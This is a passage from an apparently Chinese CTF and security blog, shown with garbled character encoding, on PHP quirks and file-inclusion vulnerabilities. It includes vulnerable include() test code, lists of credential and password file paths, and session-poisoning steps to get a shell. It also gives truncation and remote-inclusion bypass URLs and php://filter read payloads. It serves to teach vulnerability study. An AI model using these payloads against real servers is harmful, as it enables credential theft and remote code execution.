title="intvalå‡½æ•°"></a>intvalå‡½æ•°</h2><p><strong>Intvalå‡½æ•°</strong>ç”¨äºè·å–å˜é‡æ•´æ•°æ•°å€¼<br>Intvalæœ€å¤§çš„å€¼å–å†³äºæ“ä½œç³»ç»Ÿã€‚ 32 ä½ç³»ç»Ÿæœ€å¤§å¸¦ç¬¦å·çš„ integer èŒƒå›´æ˜¯ -2147483648 åˆ° 2147483647ã€‚ä¸¾ä¾‹ï¼Œåœ¨è¿™æ ·çš„ç³»ç»Ÿä¸Šï¼Œ intval(â€˜1000000000000â€™) ä¼šè¿”å› 2147483647ã€‚64 ä½ç³»ç»Ÿä¸Šï¼Œæœ€å¤§å¸¦ç¬¦å·çš„ integer å€¼æ˜¯ 9223372036854775807ã€‚</p><p>è¿™ä¸ªæœ‰ä¸ªåº”ç”¨å°±æ˜¯åœ¨åˆ¤æ–­æ•°å€¼æ˜¯ä¸æ˜¯å›æ–‡ä¸Šï¼Œå¦‚æœå‚æ•°ä¸º2147483647ï¼Œé‚£ä¹ˆå½“å®ƒåè¿‡æ¥ï¼Œç”±äºè¶…å‡ºäº†é™åˆ¶ï¼Œæ‰€ä»¥ä¾ç„¶ç­‰äº2147483647ã€‚å³ä¸ºå›æ–‡ã€‚</p><p>intvalå‡½æ•°èƒ½è¢«%00æˆªæ–­ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$number=<span class="string">&#x27;0&#x27;</span>.chr(<span class="number">0</span>).<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">var_dump(intval($number));</span><br><span class="line"><span class="keyword">if</span>($number!=strval(intval($number)))&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º123</span></span><br></pre></td></tr></table></figure><h2 id="switchå‡½æ•°"><a href="#switchå‡½æ•°" class="headerlink" title="switchå‡½æ•°"></a>switchå‡½æ•°</h2><p>å¦‚æœswitchæ˜¯æ•°å­—ç±»å‹çš„caseçš„åˆ¤æ–­æ—¶ï¼Œswitchä¼šå°†å…¶ä¸­çš„å‚æ•°è½¬æ¢ä¸ºintç±»å‹ï¼Œæ•ˆæœç›¸å½“äºintvalå‡½æ•°ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$i =<span class="string">&quot;abc&quot;</span>;  </span><br><span class="line"><span class="keyword">switch</span> ($i) &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">456</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// è¾“å‡º123</span></span><br></pre></td></tr></table></figure><p>switchæ²¡æœ‰ç¢°åˆ°breakæ—¶ä¼šä¸€ç›´å¾€ä¸‹æ‰§è¡Œï¼Œç›´åˆ°é‡åˆ°break,ä¾‹å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$i =<span class="string">&quot;abc&quot;</span>;  </span><br><span class="line"><span class="keyword">switch</span> ($i) &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>; </span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">456</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡º123456</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> phpå‡½æ•° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶åŒ…å«æ¼æ´åŠåˆ©ç”¨æ–¹å¼</title>
      <link href="2019/09/20/file-contant-leak/"/>
      <url>2019/09/20/file-contant-leak/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æ–‡ä»¶åŒ…å«æ¼æ´åŠåˆ©ç”¨æ–¹å¼ï¼</p><a id="more"></a><h2 id="æœ‰å…³åŒ…å«çš„å‡½æ•°"><a href="#æœ‰å…³åŒ…å«çš„å‡½æ•°" class="headerlink" title="æœ‰å…³åŒ…å«çš„å‡½æ•°"></a>æœ‰å…³åŒ…å«çš„å‡½æ•°</h2><p>PHPä¸­æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ä»¥ä¸‹å››ç§ï¼š</p><ol><li>include()</li><li>include_once()</li><li>require()</li><li>require_once()</li></ol><p>includeå’ŒrequireåŒºåˆ«ä¸»è¦æ˜¯ï¼Œincludeåœ¨åŒ…å«çš„è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç¨‹åºç»§ç»­æ­£å¸¸è¿è¡Œï¼›è€Œrequireå‡½æ•°å‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œä¼šç›´æ¥æŠ¥é”™å¹¶é€€å‡ºç¨‹åºçš„æ‰§è¡Œã€‚</p><p>è€Œinclude_once()ï¼Œrequire_once()è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä¸å‰ä¸¤ä¸ªçš„ä¸åŒä¹‹å¤„åœ¨äºè¿™ä¸¤ä¸ªå‡½æ•°åªåŒ…å«ä¸€æ¬¡ï¼Œé€‚ç”¨äºåœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒä¸€ä¸ªæ–‡ä»¶æœ‰å¯èƒ½è¢«åŒ…æ‹¬è¶…è¿‡ä¸€æ¬¡çš„æƒ…å†µä¸‹ï¼Œä½ æƒ³ç¡®ä¿å®ƒåªè¢«åŒ…æ‹¬ä¸€æ¬¡ä»¥é¿å…å‡½æ•°é‡å®šä¹‰ï¼Œå˜é‡é‡æ–°èµ‹å€¼ç­‰é—®é¢˜ã€‚</p><h2 id="æœ¬åœ°åŒ…å«LFI-Local-File-Inclusion"><a href="#æœ¬åœ°åŒ…å«LFI-Local-File-Inclusion" class="headerlink" title="æœ¬åœ°åŒ…å«LFI(Local File Inclusion)"></a>æœ¬åœ°åŒ…å«LFI(Local File Inclusion)</h2><h3 id="æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ— é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´</h3><p><strong>æµ‹è¯•ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/09/20/file-contant-leak/1535362888_5b83c7486a92c.png"></p><p>é€šè¿‡ç›®å½•éå†æ¼æ´å¯ä»¥è·å–åˆ°ç³»ç»Ÿä¸­å…¶ä»–æ–‡ä»¶çš„å†…å®¹ï¼š</p><p>å¸¸è§çš„æ•æ„Ÿä¿¡æ¯è·¯å¾„ï¼š</p><p><strong>Windowsç³»ç»Ÿ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini &#x2F;&#x2F; æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IISé…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F; å­˜å‚¨Windowsç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç </span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQLé…ç½®</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL rootå¯†ç </span><br><span class="line"></span><br><span class="line">c:\windows\php.ini &#x2F;&#x2F; php é…ç½®ä¿¡æ¯</span><br></pre></td></tr></table></figure><p><strong>Linux/Unixç³»ç»Ÿ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; è´¦æˆ·ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;shadow &#x2F;&#x2F; è´¦æˆ·å¯†ç æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2é»˜è®¤é…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; è™šæ‹Ÿç½‘ç«™é…ç½®</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHPç›¸å…³é…ç½®</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apacheé…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure><h3 id="sessionæ–‡ä»¶åŒ…å«æ¼æ´"><a href="#sessionæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="sessionæ–‡ä»¶åŒ…å«æ¼æ´"></a>sessionæ–‡ä»¶åŒ…å«æ¼æ´</h3><p>åˆ©ç”¨æ¡ä»¶ï¼š<strong>sessionçš„å­˜å‚¨ä½ç½®å¯ä»¥è·å–</strong></p><ol><li>é€šè¿‡phpinfoçš„ä¿¡æ¯å¯ä»¥è·å–åˆ°sessionçš„å­˜å‚¨ä½ç½®ã€‚<br>é€šè¿‡phpinfoçš„ä¿¡æ¯ï¼Œè·å–åˆ°session.save_pathä¸º<code>/var/lib/php/session</code>ï¼š</li></ol><p>è·å–åˆ°sessionçš„å­˜å‚¨ä½ç½®</p><p><img src="/2019/09/20/file-contant-leak/1535366976_5b83d740d5e48.png"></p><ol start="2"><li>é€šè¿‡çŒœæµ‹é»˜è®¤çš„sessionå­˜æ”¾ä½ç½®è¿›è¡Œå°è¯•ã€‚<br>å¦‚linuxä¸‹é»˜è®¤å­˜å‚¨åœ¨<code>/var/lib/php/session</code>ç›®å½•ä¸‹ï¼š</li></ol><p><img src="/2019/09/20/file-contant-leak/1535366988_5b83d74c81ff5.png"></p><p><strong>sessionä¸­çš„å†…å®¹å¯ä»¥è¢«æ§åˆ¶ï¼Œä¼ å…¥æ¶æ„ä»£ç </strong>ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$ctfs&#x3D;$_GET[&#39;ctfs&#39;];</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;username&quot;]&#x3D;$ctfs;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>æ¼æ´åˆ†æ:</strong></p><p>æ­¤phpä¼šå°†è·å–åˆ°çš„GETå‹ctfså˜é‡çš„å€¼å­˜å…¥åˆ°sessionä¸­ã€‚</p><p>å½“è®¿é—®<code>http://www.ctfs-wiki/session.php?ctfs=ctfs</code> åï¼Œä¼šåœ¨<code>/var/lib/php/session</code>ç›®å½•ä¸‹å­˜å‚¨sessionçš„å€¼ã€‚</p><p>sessionçš„æ–‡ä»¶åä¸º<code>sess_+sessionid</code>ï¼Œsessionidå¯ä»¥é€šè¿‡å¼€å‘è€…æ¨¡å¼è·å–ã€‚</p><p><img src="/2019/09/20/file-contant-leak/1535366999_5b83d757ab229.png"></p><p>æ‰€ä»¥sessionçš„æ–‡ä»¶åä¸º<code>sess_akp79gfiedh13ho11i6f3sm6s6</code>ã€‚</p><p>åˆ°æœåŠ¡å™¨çš„<code>/var/lib/php/session</code>ç›®å½•ä¸‹æŸ¥çœ‹æœç„¶å­˜åœ¨æ­¤æ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š</p><pre><code>username|s:4:&quot;ctfs&quot;;[root@c21336db44d2 session]# cat sess_akp79gfiedh13ho11i6f3sm6s6username|s:4:&quot;ctfs&quot;</code></pre><p><strong>æ¼æ´åˆ©ç”¨</strong></p><p>é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œå¯ä»¥çŸ¥é“ctfsä¼ å…¥çš„å€¼ä¼šå­˜å‚¨åˆ°sessionæ–‡ä»¶ä¸­ï¼Œå¦‚æœå­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°±å¯ä»¥é€šè¿‡ctfså†™å…¥æ¶æ„ä»£ç åˆ°sessionæ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œæ­¤æ¶æ„ä»£ç getshellã€‚</p><p>å½“è®¿é—®<code>http://www.ctfs-wiki/session.php?ctfs=&lt;?php phpinfo();?&gt;</code>åï¼Œä¼šåœ¨<code>/var/lib/php/session</code>ç›®å½•ä¸‹å­˜å‚¨sessionçš„å€¼</p><pre><code>[root@6da845537b27 session]# cat sess_83317220159fc31cd7023422f64bea1ausername|s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;</code></pre><p>æ”»å‡»è€…é€šè¿‡phpinfo()ä¿¡æ¯æ³„éœ²æˆ–è€…çŒœæµ‹èƒ½è·å–åˆ°sessionå­˜æ”¾çš„ä½ç½®ï¼Œæ–‡ä»¶åç§°é€šè¿‡å¼€å‘è€…æ¨¡å¼å¯è·å–åˆ°ï¼Œç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«çš„æ¼æ´è§£ææ¶æ„ä»£ç getshellã€‚</p><h3 id="æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡"><a href="#æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡" class="headerlink" title="æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡"></a>æœ‰é™åˆ¶æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡</h3><h4 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­"></a>%00æˆªæ–­</h4><p><strong>æ¡ä»¶ï¼š</strong><code>magic_quotes_gpc = Off phpç‰ˆæœ¬&lt;5.3.4</code></p><p><strong>æµ‹è¯•ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•ç»“æœï¼š</strong></p><pre><code>http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00</code></pre><p><img src="/2019/09/20/file-contant-leak/1535362913_5b83c7614d63c.png"></p><h4 id="è·¯å¾„é•¿åº¦æˆªæ–­"><a href="#è·¯å¾„é•¿åº¦æˆªæ–­" class="headerlink" title="è·¯å¾„é•¿åº¦æˆªæ–­"></a>è·¯å¾„é•¿åº¦æˆªæ–­</h4><p><strong>æ¡ä»¶ï¼š</strong>windows OSï¼Œç‚¹å·éœ€è¦é•¿äº256ï¼›linux OS é•¿äº4096</p><pre><code>Windowsä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º256å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒï¼›Linuxä¸‹ç›®å½•æœ€å¤§é•¿åº¦ä¸º4096å­—èŠ‚ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šè¢«ä¸¢å¼ƒã€‚</code></pre><p><strong>æµ‹è¯•ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>EXP:</strong></p><pre><code>http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code></pre><p><img src="/2019/09/20/file-contant-leak/1535362924_5b83c76c8b50a.png"></p><h4 id="ç‚¹å·æˆªæ–­"><a href="#ç‚¹å·æˆªæ–­" class="headerlink" title="ç‚¹å·æˆªæ–­"></a>ç‚¹å·æˆªæ–­</h4><p><code>æ¡ä»¶ï¼š</code>windows OSï¼Œç‚¹å·éœ€è¦é•¿äº256</p><pre><code>æµ‹è¯•ä»£ç ï¼š</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename . &quot;.html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>EXP:</strong></p><pre><code>http://www.ctfs-wiki.com/FI/FI.phpï¼Ÿfilename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</code></pre><p><img src="/2019/09/20/file-contant-leak/1535361836_5b83c32c4668a.png"></p><h2 id="è¿œç¨‹åŒ…å«RFI-Remote-File-Inclusion"><a href="#è¿œç¨‹åŒ…å«RFI-Remote-File-Inclusion" class="headerlink" title="è¿œç¨‹åŒ…å«RFI(Remote File Inclusion)"></a>è¿œç¨‹åŒ…å«RFI(Remote File Inclusion)</h2><p>PHPçš„é…ç½®æ–‡ä»¶<code>allow_url_fopen</code>å’Œ<code>allow_url_include</code>è®¾ç½®ä¸ºONï¼Œ<code>include/require</code>ç­‰åŒ…å«å‡½æ•°å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶ï¼Œå¦‚æœè¿œç¨‹æ–‡ä»¶æ²¡ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå¯¼è‡´äº†æ‰§è¡Œæ¶æ„æ–‡ä»¶çš„ä»£ç ï¼Œè¿™å°±æ˜¯è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><pre><code>allow_url_fopen = Onï¼ˆæ˜¯å¦å…è®¸æ‰“å¼€è¿œç¨‹æ–‡ä»¶ï¼ŒPHP&lt;5.2é»˜è®¤æ‰“å¼€ï¼Œï¼‰allow_url_include = Onï¼ˆæ˜¯å¦å…è®¸include/requireè¿œç¨‹æ–‡ä»¶ï¼Œé»˜è®¤å…³é—­ï¼‰</code></pre><h3 id="æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ— é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´</h3><p><strong>æµ‹è¯•ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒåŒ…å«php.txtå¯ä»¥è§£æã€‚</p><pre><code>http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt</code></pre><p><strong>æµ‹è¯•ç»“æœï¼š</strong><br><img src="/2019/09/20/file-contant-leak/1535361964_5b83c3aceeb21.png"></p><h3 id="æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡"><a href="#æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡" class="headerlink" title="æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡"></a>æœ‰é™åˆ¶è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ç»•è¿‡</h3><p><strong>æµ‹è¯•ä»£ç ï¼š</strong></p><pre><code>&lt;?php include($_GET[&#39;filename&#39;] . &quot;.html&quot;); ?&gt;</code></pre><p>ä»£ç ä¸­å¤šæ·»åŠ äº†htmlåç¼€ï¼Œå¯¼è‡´è¿œç¨‹åŒ…å«çš„æ–‡ä»¶ä¹Ÿä¼šå¤šä¸€ä¸ªhtmlåç¼€ã€‚</p><p><img src="/2019/09/20/file-contant-leak/1535362030_5b83c3ee6c99b.png"></p><h4 id="é—®å·ç»•è¿‡"><a href="#é—®å·ç»•è¿‡" class="headerlink" title="é—®å·ç»•è¿‡"></a>é—®å·ç»•è¿‡</h4><pre><code>http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?</code></pre><p><img src="/2019/09/20/file-contant-leak/1535362020_5b83c3e4ef0d3.png"></p><h4 id="å·ç»•è¿‡"><a href="#å·ç»•è¿‡" class="headerlink" title="#å·ç»•è¿‡"></a>#å·ç»•è¿‡</h4><pre><code>http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23</code></pre><p><img src="/2019/09/20/file-contant-leak/1535362014_5b83c3de83a8c.png"></p><p>è¿˜æœ‰å“ªäº›å¯ä»¥ç»•è¿‡ï¼Ÿç”¨burpè·‘ä¸€éå‘ç°ç©ºæ ¼ä¹Ÿå¯ä»¥ç»•è¿‡ï¼š</p><p><img src="/2019/09/20/file-contant-leak/1535362006_5b83c3d6c0463.png"></p><h2 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h2><p>PHP å¸¦æœ‰å¾ˆå¤šå†…ç½® URL é£æ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äºç±»ä¼¼ <code>fopen()</code>ã€ <code>copy()</code>ã€ <code>file_exists()</code> å’Œ <code>filesize()</code> çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ã€‚ é™¤äº†è¿™äº›å°è£…åè®®ï¼Œè¿˜èƒ½é€šè¿‡ <code>stream_wrapper_register()</code>æ¥æ³¨å†Œè‡ªå®šä¹‰çš„å°è£…åè®®ã€‚</p><h3 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h3><p><img src="/2019/09/20/file-contant-leak/1535362079_5b83c41fbe910.png"></p><h3 id="php-è¾“å…¥è¾“å‡ºæµ"><a href="#php-è¾“å…¥è¾“å‡ºæµ" class="headerlink" title="php:// è¾“å…¥è¾“å‡ºæµ"></a>php:// è¾“å…¥è¾“å‡ºæµ</h3><p>PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œ å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚</p><h3 id="php-filterï¼ˆæœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å–ï¼‰"><a href="#php-filterï¼ˆæœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å–ï¼‰" class="headerlink" title="php://filterï¼ˆæœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å–ï¼‰"></a>php://filterï¼ˆæœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å–ï¼‰</h3><p>å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºâ€æ•°æ®æµæ‰“å¼€â€æ—¶çš„â€ç­›é€‰è¿‡æ»¤â€åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™ã€‚</p><p><strong>ç”¨æ³•ï¼š</strong></p><pre><code>?filename=php://filter/convert.base64-encode/resource=xxx.php ?filename=php://filter/read=convert.base64-encode/resource=xxx.php ä¸€æ ·ã€‚</code></pre><p><strong>æ¡ä»¶ï¼š</strong>åªæ˜¯è¯»å–ï¼Œéœ€è¦å¼€å¯ allow_url_fopenï¼Œä¸éœ€è¦å¼€å¯ allow_url_includeï¼›</p><p><img src="/2019/09/20/file-contant-leak/1535362099_5b83c4338ee40.png"></p><p><strong>æµ‹è¯•ä»£ç ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="php-input"><a href="#php-input" class="headerlink" 